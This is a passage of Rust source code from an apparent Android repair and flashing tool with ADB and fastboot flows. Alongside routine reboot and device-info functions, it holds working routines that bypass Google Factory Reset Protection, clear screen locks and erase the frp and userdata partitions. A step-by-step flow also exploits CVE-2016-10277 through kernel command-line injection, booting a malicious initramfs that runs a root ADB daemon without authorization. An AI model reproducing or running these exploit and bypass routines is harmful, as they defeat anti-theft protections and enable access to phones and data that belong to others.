        ("open settings via activity", "am start -n com.android.settings/.Settings"),
        ("allow USB settings (Android 7-8)", "settings put global usb_mass_storage_enabled 1"),
        ("disable FRP lock flag via settings provider", "settings put secure frp_done 1"),
        ("back to home", "input keyevent 3"),
    ];
    for (_, cmd) in commands {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_secs(2));
    }
    // Verify
    match adb::shell_cli(&serial, 10_000, &["settings get secure frp_done".to_string()]) {
        Ok(text) => out.push(format!("check FRP flag: {}", text.trim())),
        Err(e) => out.push(format!("check FRP flag failed: {e}")),
    }
    Ok(())
}

/// `factory_reset` — `adb shell recovery --wipe_data` when authorized, with
/// a guided recovery-menu fallback (no writes when ADB is unavailable).
pub fn flow_factory_reset(out: &mut Vec<String>) -> Result<()> {
    out.push("FACTORY RESET".to_string());
    let rows = adb::devices_json_no_probe().unwrap_or_else(|_| "[]".to_string());
    let up = rows.lines().any(|l| {
        l.splitn(2, '\t')
            .nth(1)
            .unwrap_or("")
            .split_whitespace()
            .next()
            == Some("device")
    });
    if up {
        out.push("  ADB authorized - sending: adb shell recovery --wipe_data".to_string());
        return match adb::shell_cli("-", 30_000, &["recovery --wipe_data".to_string()]) {
            Ok(text) => {
                out.push(format!("  response: {}", {
                    let t = text.trim();
                    if t.is_empty() { "ok".to_string() } else { t[..t.len().min(160)].to_string() }
                }));
                out.push("  The phone is wiping /data and will restart.".to_string());
                Ok(())
            }
            Err(e) => {
                out.push(format!("  adb wipe failed: {e} (falling back to recovery menu)"));
                recovery_menu_guidance(out);
                Ok(())
            }
        };
    }
    out.push("  no authorized ADB - using the guided recovery menu.".to_string());
    recovery_menu_guidance(out);
    Ok(())
}

fn recovery_menu_guidance(out: &mut Vec<String>) {
    out.push("  Manual recovery reset:".to_string());
    out.push("  1. Power the phone off completely.".to_string());
    out.push("  2. Hold Volume Up + Power together.".to_string());
    out.push("  3. Keep holding until the Samsung logo appears; release Power but".to_string());
    out.push("     KEEP holding Volume Up until the recovery menu appears.".to_string());
    out.push("     (If you see 'No command', hold Power and press Volume Up once.)".to_string());
    out.push("  4. Volume keys: highlight 'Wipe data/factory reset' -> Power.".to_string());
    out.push("  5. Highlight 'Factory data reset' -> Power.".to_string());
    out.push("  6. Highlight 'Reboot system now' -> Power.".to_string());
    out.push("  WARNING: if a Google account was on the phone it will stop at".to_string());
    out.push("  'Verify your account' (Google FRP). That is expected; then use".to_string());
    out.push("  the FRP bypass tab to clear it.".to_string());
}

/// `screen_lock_remove` — clear lockscreen settings via ADB; states the
/// honest limits (encryption / Knox) up front.
pub fn flow_screen_lock_remove(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL - ADB METHOD".to_string());
    out.push("WARNING: This method has limited success on modern devices (encryption,".to_string());
    out.push("Knox); for reliable results use download mode or factory reset.".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(60), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode { expected: "device (adb authorized)".to_string(), actual: "no adb device".to_string() })
    })?;
    out.push(format!("Device serial: {serial}"));
    // Encryption gate
    if let Ok(enc) = adb::shell_cli(&serial, 10_000, &["getprop ro.crypto.state".to_string()]) {
        let enc = enc.trim();
        out.push(format!("Device encryption: {enc}"));
        if enc == "encrypted" {
            out.push("WARNING: Device is encrypted. ADB methods will NOT work.".to_string());
            out.push("Use download mode method or factory reset instead.".to_string());
        }
    }
    out.push(String::new());
    let methods: &[(&str, &[&str])] = &[
        ("Clear lock via settings commands", &[
            "settings put secure lock_pattern_enable 0",
            "settings put secure lock_password_enable 0",
            "settings put secure lock_biometric_weak 0",
            "settings put global lockscreen_disabled 1",
        ]),
        ("Clear keyguard + locksettings", &[
            "locksettings clear --old 0",
            "wm dismiss-keyguard",
        ]),
    ];
    for (label, cmds) in methods {
        out.push(format!("{label}..."));
        for cmd in *cmds {
            adb_step(&serial, cmd, Duration::from_secs(20), out);
        }
    }
    out.push("Done. Check the phone screen; if the lock persists use factory reset.".to_string());
    Ok(())
}

/// `repair_settings` — re-enable disabled system packages + clear the
/// corrupted Settings/SystemUI state (no factory reset).
pub fn flow_repair_settings(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("REPAIR SETTINGS / UI CRASH (no factory reset)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(90), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode { expected: "device (adb authorized)".to_string(), actual: "no adb device".to_string() })
    })?;
    let reenable: &[(&str, &str)] = &[
        ("Settings", "com.android.settings"),
        ("System UI", "com.android.systemui"),
        ("One UI Home (launcher)", "com.samsung.android.launcher"),
        ("Samsung Settings ext.", "com.samsung.android.app.settings.bixby"),
    ];
    let clear: &[(&str, &str)] = &[
        ("Settings", "com.android.settings"),
        ("System UI", "com.android.systemui"),
    ];
    out.push("Step 1/3 - check for disabled system packages ...".to_string());
    let disabled = adb::shell_cli(&serial, 30_000, &["pm list packages -d".to_string()])
        .unwrap_or_default();
    let mut reenabled = 0;
    for (name, pkg) in reenable {
        if disabled.contains(pkg) {
            out.push(format!("  {name} ({pkg}) is DISABLED - re-enabling ..."));
            match adb::shell_cli(&serial, 20_000, &[format!("pm enable {pkg}")]) {
                Ok(text) => {
                    reenabled += 1;
                    let first = text.lines().next().unwrap_or("");
                    out.push(format!("      {}", &first[..first.len().min(120)]));
                }
                Err(e) => out.push(format!("      failed: {e}")),
            }
        }
    }
    if reenabled == 0 {
        out.push("  no disabled packages found".to_string());
    }
    out.push("Step 2/3 - clear corrupted app state (cache + data) ...".to_string());
    for (name, pkg) in clear {
        out.push(format!("  {name}: pm clear {pkg}"));
        match adb::shell_cli(&serial, 30_000, &[format!("pm clear {pkg}")]) {
            Ok(text) => {
                let first = text.lines().next().unwrap_or("");
                out.push(format!("      {}", &first[..first.len().min(120)]));
            }
            Err(e) => out.push(format!("      {e}")),
        }
    }
    out.push("Step 3/3 - restart System UI and launch Settings to verify ...".to_string());
    let _ = adb::shell_cli(&serial, 15_000, &["am crash com.android.systemui".to_string()]);
    thread::sleep(Duration::from_secs(3));
    match adb::shell_cli(&serial, 15_000, &["am start -a android.settings.SETTINGS".to_string()]) {
        Ok(text) => out.push(format!("  settings launch: {}", text.trim())),
        Err(e) => out.push(format!("  settings launch failed: {e}")),
    }
    out.push("  Check the phone: Settings should open normally now. If the phone".to_string());
    out.push("  still misbehaves, reboot it (`adb reboot`) - the cleared state".to_string());
    out.push("  persists. No factory reset was needed.".to_string());
    Ok(())
}

// ---------------------------------------------------------------------------
// Fastboot / moto flows — the native fastboot transport (fastboot::run_command)
// with a target-pinned `vid:pid@bus:addr` (never first-match; the multi-device
// rule). The unlock code comes in explicitly via flow-run --code — no hidden
// env, no fake automation: the code is per-device and server-issued.
// ---------------------------------------------------------------------------

/// Wait for a fastboot device; returns the pinned target
/// `vid:pid@bus:addr`. Polls the native fastboot detect with concise
/// cable/mode guidance when nothing appears.
fn wait_fastboot_device(timeout: Duration, out: &mut Vec<String>) -> Option<String> {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if let Ok(rows) = crate::fastboot::fastboot_devices_cli() {
            if let Ok(devs) = serde_json::from_str::<Vec<serde_json::Value>>(&rows) {
                if let Some(d) = devs.first() {
                    let target = format!(
                        "{}:{}@{}:{}",
                        d.get("vid").and_then(|v| v.as_str()).unwrap_or(""),
                        d.get("pid").and_then(|v| v.as_str()).unwrap_or(""),
                        d.get("bus").and_then(|v| v.as_u64()).unwrap_or(0),
                        d.get("address").and_then(|v| v.as_u64()).unwrap_or(0),
                    );
                    out.push(format!("fastboot device: {target}"));
                    return Some(target);
                }
            }
        }
        thread::sleep(Duration::from_secs(2));
    }
    out.push("  no device in fastboot mode. Put the phone into fastboot".to_string());
    out.push("  (power off, hold Volume Down + Power, or from Android".to_string());
    out.push("  `adb reboot bootloader`) and rerun.".to_string());
    None
}

/// Resolve the fastboot target for a flow: an explicitly-passed target
/// (pinned, never first-match) is honoured directly; otherwise wait for
/// the first fastboot device.
fn resolve_fastboot_target(target: &str, timeout: Duration, out: &mut Vec<String>) -> Option<String> {
    if !target.is_empty() {
        return Some(target.to_string());
    }
    wait_fastboot_device(timeout, out)
}

/// Run one fastboot command over the native transport; the transcript is
/// logged (device-side FAILs are part of the transcript, not aborts).
fn fb_run(target: &str, cmd: &str, timeout: Duration, out: &mut Vec<String>) -> String {
    out.push(format!("  > fastboot {cmd}"));
    match crate::fastboot::run_command(target, cmd, timeout) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("      {line}"));
            }
            text
        }
        Err(e) => {
            out.push(format!("      ERROR: {e}"));
            format!("ERROR: {e}")
        }
    }
}

/// Read a getvar value from the transcript (the `(bootloader) var: value` shape).
fn fb_getvar_value(transcript: &str, var: &str) -> String {
    for line in transcript.lines() {
        let line = line.trim();
        if let Some(rest) = line.strip_prefix("(bootloader) ") {
            if let Some(value) = rest.strip_prefix(&format!("{var}: ")) {
                return value.trim().to_string();
            }
        }
    }
    String::new()
}

fn locked_state(transcript: &str) -> String {
    let a = fb_getvar_value(transcript, "securestate");
    if !a.is_empty() {
        return a;
    }
    fb_getvar_value(transcript, "unlocked")
}

/// `fastboot_unlock` — `oem unlock <code>` with the two-step wipe confirm
/// and a verified lock-state check after. Requires --code.
pub fn flow_fastboot_unlock(target: &str, code: &str, out: &mut Vec<String>) -> Result<()> {
    if code.is_empty() {
        out.push("  No unlock code supplied - the code is per-device and".to_string());
        out.push("  server-issued (Motorola portal / OEM channel). Re-run with".to_string());
        out.push("  --code <CODE>.".to_string());
        return Err(BridgeError::InvalidArgument(
            "unlock code required (--code <CODE>)".to_string(),
        ));
    }
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    let state = locked_state(&fb_run(&target, "getvar securestate", Duration::from_secs(20), out));
    out.push(format!("  securestate: {}", if state.is_empty() { "(not reported)" } else { &state }));
    out.push("STEP - unlock the bootloader (WIPES the device)".to_string());
    let mut out_text = fb_run(&target, &format!("oem unlock {code}"), Duration::from_secs(120), out);
    if out_text.contains("re-run this command") {
        out.push("  Bootloader asks for confirmation - re-running to confirm ...".to_string());
        out_text = fb_run(&target, &format!("oem unlock {code}"), Duration::from_secs(120), out);
    }
    if out_text.contains("Allow OEM Unlock") {
        out.push("  BLOCKED by the Android-side toggle: 'Allow OEM Unlock' is OFF".to_string());
        out.push("  in Settings > Developer Options. Enable it on the phone, then".to_string());
        out.push("  re-run with the same code.".to_string());
        return Ok(());
    }
    if out_text.contains("FAILED") || out_text.to_lowercase().contains("error") {
        out.push("  `oem unlock` failed - check the code and the OEM-unlock toggle.".to_string());
        return Ok(());
    }
    // Verify the unlock landed.
    let now = locked_state(&fb_run(&target, "getvar securestate", Duration::from_secs(20), out));
    out.push(format!("  securestate now: {}", if now.is_empty() { "(not reported)" } else { &now }));
    if now.contains("locked") && !now.contains("unlocked") {
        out.push("  Still locked - re-check the toggle and the code, then re-run.".to_string());
        return Ok(());
    }
    fb_run(&target, "reboot", Duration::from_secs(30), out);
    out.push("  Done. The phone wipes data on first boot (expected).".to_string());
    Ok(())
}

/// `fastboot_frp` — erase the frp partition (needs an unlocked bootloader;
/// locked Motorola bootloaders refuse with 'Permission denied').
pub fn flow_fastboot_frp(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    let state = locked_state(&fb_run(&target, "getvar securestate", Duration::from_secs(20), out));
    out.push(format!("  securestate: {}", if state.is_empty() { "(not reported)" } else { &state }));
    if state.contains("locked") && !state.contains("unlocked") {
        out.push("  Bootloader is LOCKED - `erase frp` will be refused ('Permission".to_string());
        out.push("  denied'). Unlock first ('fastboot unlock' / the portal flow).".to_string());
        return Ok(());
    }
    fb_run(&target, "erase frp", Duration::from_secs(120), out);
    fb_run(&target, "erase cache", Duration::from_secs(60), out);
    out.push("  Done. Rebooting ...".to_string());
    fb_run(&target, "reboot", Duration::from_secs(30), out);
    Ok(())
}

/// `fastboot_wipe` — erase userdata + cache via fastboot.
pub fn flow_fastboot_wipe(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    out.push("  Erases ALL user data (apps, accounts, photos, lock).".to_string());
    let w1 = fb_run(&target, "erase userdata", Duration::from_secs(180), out);
    let w2 = fb_run(&target, "erase cache", Duration::from_secs(60), out);
    if w1.contains("FAILED") && w2.contains("FAILED") {
        out.push("  Both erases failed - the bootloader may not expose them. Use the".to_string());
        out.push("  recovery-menu factory reset instead.".to_string());
        return Ok(());
    }
    fb_run(&target, "reboot", Duration::from_secs(30), out);
    out.push("  Done. The phone boots to setup as a fresh device.".to_string());
    Ok(())
}

/// `fastboot_erase` — erase one partition (FASTBOOT_PARTITION or --partition).
pub fn flow_fastboot_erase(target: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    if partition.is_empty() {
        return Err(BridgeError::InvalidArgument(
            "partition required (--partition <name>)".to_string(),
        ));
    }
    fb_run(&target, &format!("erase {partition}"), Duration::from_secs(120), out);
    out.push("  Done.".to_string());
    Ok(())
}

/// `fastboot_reboot` — reboot out of fastboot (into the OS).
pub fn flow_fastboot_reboot(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    fb_run(&target, "reboot", Duration::from_secs(30), out);
    out.push("  Rebooting to normal mode.".to_string());
    Ok(())
}

/// `moto_frp_fastboot` — the CVE-2016-10277 (initroot) strategy: kernel
/// cmdline injection via the unprotected `fsg-id` UTAG boots a per-device
/// initramfs with a root ADB daemon (no auth), then root ADB wipes FRP.
/// Public research: alephsecurity/initroot (Roee Hay, Aleph Research, HCL).
///
/// Honest gates, in order:
///   1. bootloader version — the injection is a Kernel-3.10/3.18-era
///      bootloader family (G4/G5/X/Z era); newer bootloaders may be patched.
///   2. `fsg-id` UTAG must read back protected="false" or the exploit is
///      dead on this device — say so and stop.
///   3. the per-device initramfs (`--file initroot-<device>.cpio.gz`) is
///      NEVER shipped with this app; the user produces their own.
///   4. scratch/initrd address (`--partition 0x...`) is device-specific.
pub fn flow_moto_frp_fastboot(
    target: &str,
    file: &str,
    partition: &str,
    out: &mut Vec<String>,
) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => {
            return Err(BridgeError::DeviceState(
                crate::error::DeviceStateError::NotInDownloadMode,
            ));
        }
    };
    out.push("MOTOROLA - FRP REMOVE (FASTBOOT - CVE-2016-10277 / initroot)".to_string());
    out.push("  Kernel cmdline injection via the fsg-id UTAG boots a per-device".to_string());
    out.push("  initramfs whose ADB daemon runs as root with no authorization -".to_string());
    out.push("  then root ADB wipes the FRP partition. Attribution: public research".to_string());
    out.push("  alephsecurity/initroot (Roee Hay / Aleph Research, HCL Technologies).".to_string());
    out.push(String::new());

    out.push("STEP 1/5 - read the bootloader version (honest gate)".to_string());
    let bl = fb_run(&target, "getvar version-bootloader", Duration::from_secs(20), out);
    out.push(format!(
        "  version-bootloader: {}",
        if bl.is_empty() { "(not reported)".to_string() } else { bl.clone() }
    ));
    out.push("  The injection targets the Kernel-3.10/3.18 bootloader family".to_string());
    out.push("  (Moto G4/G5/X/Z era). Newer bootloaders (G6 and later) commonly".to_string());
    out.push("  protect the fsg-id UTAG - the next step reads it and tells the truth.".to_string());
    out.push(String::new());

    out.push("STEP 2/5 - read the fsg-id UTAG (exploit liveness check)".to_string());
    let utag = fb_run(&target, "oem config fsg-id", Duration::from_secs(30), out);
    if utag.is_empty() || utag.contains("ERROR") || utag.contains("FAILED") {
        out.push("  The bootloader did not report the fsg-id UTAG (transport error".to_string());
        out.push("  or `oem config` unsupported here). A failed read is NOT a live".to_string());
        out.push("  exploit: CVE-2016-10277 is NOT confirmed usable on this device;".to_string());
        out.push("  replug in fastboot and re-run, or keep the ADB FRP path as the".to_string());
        out.push("  realistic one once ADB is enabled. Research backlog: other vectors.".to_string());
        return Ok(());
    }
    if utag.contains("protected=\"true\"") || utag.contains("protected=true") {
        out.push("  fsg-id UTAG reads back protected=\"true\" - the cmdline injection".to_string());
        out.push("  is patched on this bootloader. CVE-2016-10277 is NOT usable here;".to_string());
        out.push("  the honest next step is the ADB path (moto_frp_adb) once ADB is".to_string());
        out.push("  enabled, or other research vectors as they are validated.".to_string());
        return Ok(());
    }
    out.push("  fsg-id UTAG is unprotected - the injection primitive is alive:".to_string());
    for line in utag.lines().take(6) {
        out.push(format!("    {line}"));
    }
    out.push(String::new());

    out.push("STEP 3/5 - supply the per-device initramfs (never shipped)".to_string());
    if file.is_empty() {
        out.push("  No initramfs supplied - stopping before any write. The exploit".to_string());
        out.push("  needs a per-device malicious initramfs (initroot-<device>.cpio.gz)".to_string());
        out.push("  whose ADB daemon runs as root; it is model-specific and is NOT".to_string());
        out.push("  shipped with this app. Produce your own (see the alephsecurity/".to_string());
        out.push("  initroot README: cpio -R root:root -o -H newc | gzip) and re-run".to_string());
        out.push("  with --file <initroot-<device>.cpio.gz> --partition <SCRATCH_ADDR>.".to_string());
        return Ok(());
    }
    if partition.is_empty() {
        out.push("  No scratch/initrd address supplied. The injected `initrd=<addr>,<size>`".to_string());
        out.push("  points at the bootloader download buffer, whose base address is".to_string());
        out.push("  device-specific (public research documents 0xA2100000 for cedric,".to_string());
        out.push("  0x92000000 for athene). Re-run with --partition 0x<ADDR> for your".to_string());
        out.push("  device.".to_string());
        return Ok(());
    }
    let size = std::fs::metadata(file).map(|m| m.len()).unwrap_or(0);
    if size == 0 {
        return Err(BridgeError::InvalidArgument(
            "initramfs file missing or empty (--file)".to_string(),
        ));
    }

    out.push("STEP 4/5 - inject the cmdline + download the initramfs".to_string());
    // No quotes on the value: the fastboot wire protocol carries the raw
    // string (the shell strips quotes in the original PoC, so the
    // bootloader receives `oem config fsg-id a initrd=0x...,...`).
    let inject = fb_run(
        &target,
        &format!("oem config fsg-id a initrd={partition},{size}"),
        Duration::from_secs(30),
        out,
    );
    if inject.contains("FAILED") || inject.contains("ERROR") {
        out.push("  The fsg-id UTAG write was REJECTED - stopping before the".to_string());
        out.push("  download/continue (no payload is left in the buffer). This".to_string());
        out.push("  bootloader accepted the UTAG read but refused the write;".to_string());
        out.push("  re-run in fastboot, and if it repeats the CVE is not usable".to_string());
        out.push("  on this unit - the ADB path stays the realistic one.".to_string());
        return Ok(());
    }
    let dl = crate::fastboot::download_to_buffer(&target, file, Duration::from_secs(120));
    match dl {
        Ok(summary) => out.push(format!("  {summary}")),
        Err(e) => {
            out.push(format!("  download failed: {e}"));
            out.push("  The bootloader refused the payload - stopping (no partial".to_string());
            out.push("  state is left behind: reset the UTAG with a re-run or reboot).".to_string());
            return Ok(());
        }
    }

    out.push("STEP 5/5 - continue boot with the injected initramfs".to_string());
    fb_run(&target, "continue", Duration::from_secs(30), out);
    out.push("  The device boots with the injected initramfs - its ADB daemon".to_string());
    out.push("  runs as root (uid 0) and does not ask for authorization. Wait for".to_string());
    out.push("  ADB, then run:".to_string());
    out.push("      flashpilot-bridge flow-run moto_frp_adb".to_string());
    out.push("  which wipes the FRP partition (dd if=/dev/zero of=<frp block>) and".to_string());
    out.push("  resets the wizard state over the root ADB session.".to_string());
    out.push("Done.".to_string());
    Ok(())
}

// ---------------------------------------------------------------------------
// Reboot flows — ADB first (authorized), then manual key-combo guidance.
// The MTP/diag AT vector is the GUI's USB-mode picker territory (mtp module);
// these flows state the manual path honestly.
// ---------------------------------------------------------------------------

fn adb_authorized_row() -> bool {
    let rows = adb::devices_json_no_probe().unwrap_or_else(|_| "[]".to_string());
    rows.lines().any(|l| {
        l.splitn(2, '\t')
            .nth(1)
            .unwrap_or("")
            .split_whitespace()
            .next()
            == Some("device")
    })
}

fn flow_reboot_mode(target: &str, title: &str, manual: &[&str], out: &mut Vec<String>) -> Result<()> {
    out.push(title.to_uppercase());
    if adb_authorized_row() {
        let cmd = format!("reboot {target}").trim().to_string();
        out.push(format!("  ADB authorized - sending: adb shell {cmd}"));
        return match adb::shell_cli("-", 30_000, &[cmd]) {
            Ok(text) => {
                let t = text.trim();
                out.push(format!("  reboot sent: {}", if t.is_empty() { "ok (phone is restarting)".to_string() } else { t[..t.len().min(120)].to_string() }));
                Ok(())
            }
            Err(e) => {
                out.push(format!("  adb reboot failed: {e}"));
                Ok(())
            }
        };
    }
    out.push("  no authorized ADB - manual key-combo:".to_string());
    for step in manual {
        out.push(format!("  - {step}"));
    }
    Ok(())
}

/// `reboot_normal` — reboot into the OS.
pub fn flow_reboot_normal(out: &mut Vec<String>) -> Result<()> {
    flow_reboot_mode(
        "",
        "reboot normally",
        &[
            "press and hold the Power button until the phone restarts",
            "or 'adb reboot' when ADB is authorized",
        ],
        out,
    )
}

/// `reboot_recovery` — reboot into recovery.
pub fn flow_reboot_recovery(out: &mut Vec<String>) -> Result<()> {
    flow_reboot_mode(
        "recovery",
        "reboot to recovery",
        &[
            "power off the phone",
            "hold Volume Up + Power (add Home on models with a Home button)",
            "release on the Samsung logo -> you are in recovery mode",
        ],
        out,
    )
}

/// `reboot_download` — reboot into download mode (04e8:685d).
pub fn flow_reboot_download(out: &mut Vec<String>) -> Result<()> {
    flow_reboot_mode(
        "download",
        "reboot to download mode",
        &[
            "power off the phone",
            "hold Volume Down + Home + Power (or Volume Down + Power)",
            "release on the 'Downloading...' warning",
            "press Volume Up to continue -> download mode (04e8:685d)",
        ],
        out,
    )
}

/// `reboot_edl` — reboot into EDL (Qualcomm 05c6:9008).
pub fn flow_reboot_edl(out: &mut Vec<String>) -> Result<()> {
    flow_reboot_mode(
        "edl",
        "reboot to EDL (Qualcomm)",
        &[
            "EDL is Qualcomm-only (not available on Exynos/MediaTek models)",
            "power off, then hold Volume Up + Volume Down while plugging in",
            "-> 05c6:9008",
        ],
        out,
    )
}

/// `reboot_bootloader` — reboot into fastboot/bootloader.
pub fn flow_reboot_bootloader(out: &mut Vec<String>) -> Result<()> {
    flow_reboot_mode(
        "bootloader",
        "reboot to fastboot/bootloader",
        &[
            "Samsung has no fastboot - Google / Qualcomm-bootloader devices only",
            "on Samsung use 'reboot to download mode' instead",
        ],
        out,
    )
}

/// `recovery` — boot the connected phone into recovery over ADB.
pub fn flow_recovery(out: &mut Vec<String>) -> Result<()> {
    out.push("REBOOT TO RECOVERY (adb)".to_string());
    if !adb_authorized_row() {
        out.push("  no authorized ADB - use 'reboot to recovery' (manual combo).".to_string());
        return Ok(());
    }
    match adb::shell_cli("-", 30_000, &["recovery".to_string()]) {
        Ok(text) => {
            let t = text.trim();
            out.push(format!("  sent: {}", if t.is_empty() { "ok (phone is restarting)".to_string() } else { t[..t.len().min(120)].to_string() }));
        }
        Err(e) => out.push(format!("  failed: {e}")),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Fastboot extras — reboot targets, slot switching, device listing, raw cmds.
// ---------------------------------------------------------------------------

/// `fastboot_reboot_bootloader` — reboot back into fastboot.
pub fn flow_fastboot_reboot_bootloader(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    out.push("FASTBOOT - REBOOT TO BOOTLOADER".to_string());
    fb_run(&target, "reboot bootloader", Duration::from_secs(30), out);
    out.push("  Rebooting to bootloader.".to_string());
    Ok(())
}

/// `fastboot_recovery` — reboot from fastboot into recovery.
pub fn flow_fastboot_recovery(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    out.push("FASTBOOT - REBOOT TO RECOVERY".to_string());
    fb_run(&target, "reboot recovery", Duration::from_secs(30), out);
    out.push("  Rebooting to recovery.".to_string());
    Ok(())
}

/// `fastboot_continue` — resume the boot (continue past fastboot).
pub fn flow_fastboot_continue(target: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    out.push("FASTBOOT - CONTINUE BOOT".to_string());
    fb_run(&target, "continue", Duration::from_secs(30), out);
    out.push("  Boot resumed.".to_string());
    Ok(())
}

/// `fastboot_set_active` — set the active A/B slot (--partition = slot, default a).
pub fn flow_fastboot_set_active(target: &str, slot: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    let slot = if slot.is_empty() { "a" } else { slot };
    out.push("FASTBOOT - SET ACTIVE SLOT".to_string());
    out.push(format!("  slot: {slot}  (--partition a/b to change)"));
    fb_run(&target, &format!("set_active {slot}"), Duration::from_secs(30), out);
    out.push("  Done.".to_string());
    Ok(())
}

/// `fastboot_devices` — JSON list of fastboot devices.
pub fn flow_fastboot_devices(out: &mut Vec<String>) -> Result<()> {
    out.push("FASTBOOT DEVICES".to_string());
    match crate::fastboot::fastboot_devices_cli() {
        Ok(rows) => {
            if let Ok(devs) = serde_json::from_str::<Vec<serde_json::Value>>(&rows) {
                if devs.is_empty() {
                    out.push("  no device in fastboot mode.".to_string());
                }
                for d in &devs {
                    out.push(format!(
                        "  {}:{}  bus={} addr={} serial={} product={}",
                        d.get("vid").and_then(|v| v.as_str()).unwrap_or("?"),
                        d.get("pid").and_then(|v| v.as_str()).unwrap_or("?"),
                        d.get("bus").and_then(|v| v.as_u64()).unwrap_or(0),
                        d.get("address").and_then(|v| v.as_u64()).unwrap_or(0),
                        d.get("serial").and_then(|v| v.as_str()).unwrap_or("-"),
                        d.get("product").and_then(|v| v.as_str()).unwrap_or("-"),
                    ));
                }
            }
        }
        Err(e) => out.push(format!("  error: {e}")),
    }
    Ok(())
}

/// `fastboot_getvar` — read one variable (FASTBOOT_PARTITION or --partition).
pub fn flow_fastboot_getvar(target: &str, var: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    let var = if var.is_empty() { "all" } else { var };
    out.push("FASTBOOT GETVAR".to_string());
    fb_run(&target, &format!("getvar {var}"), Duration::from_secs(20), out);
    Ok(())
}

/// `fastboot` — raw fastboot command passthrough (FASTBOOT_OEM or --partition).
pub fn flow_fastboot_raw(target: &str, cmd: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    let cmd = if cmd.is_empty() { "getvar all" } else { cmd };
    out.push("FASTBOOT - RAW COMMAND".to_string());
    fb_run(&target, cmd, Duration::from_secs(30), out);
    Ok(())
}

// ---------------------------------------------------------------------------
// Device info / detection flows — read-only, over the native transports and
// the Rust engines (adb getprop dump, Odin PIT, engine detects).
// ---------------------------------------------------------------------------

/// `adb_info` — device identity over ADB: properties, provisioning/FRP
/// state, lock state, encryption, battery and storage.
pub fn flow_adb_info(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    out.push("DEVICE INFO (over ADB)".to_string());
    let props: &[(&str, &str)] = &[
        ("model", "ro.product.model"),
        ("marketing name", "ro.product.marketname"),
        ("device codename", "ro.product.device"),
        ("product name", "ro.product.name"),
        ("manufacturer", "ro.product.manufacturer"),
        ("android version", "ro.build.version.release"),
        ("SDK / API level", "ro.build.version.sdk"),
        ("security patch", "ro.build.version.security_patch"),
        ("build id", "ro.build.id"),
        ("build type", "ro.build.type"),
        ("One UI version", "ro.build.version.oneui"),
        ("bootloader", "ro.bootloader"),
        ("hardware", "ro.hardware"),
        ("board platform", "ro.board.platform"),
        ("chipset", "ro.chipname"),
        ("baseband / modem", "gsm.version.baseband"),
        ("serial", "ro.serialno"),
        ("adb secure", "ro.adb.secure"),
        ("usb config", "sys.usb.config"),
        ("boot mode", "ro.bootmode"),
        ("crypto state", "ro.crypto.state"),
        ("crypto type", "ro.crypto.type"),
        ("density (dpi)", "ro.sf.lcd_density"),
    ];
    for (label, key) in props {
        let val = adb::shell_cli(&serial, 8_000, &[format!("getprop {key}")])
            .map(|v| v.trim().to_string())
            .unwrap_or_default();
        if *label == "One UI version" && val.is_empty() {
            continue;
        }
        out.push(format!("  {label:<18}: {}", if val.is_empty() { "(unset)" } else { &val }));
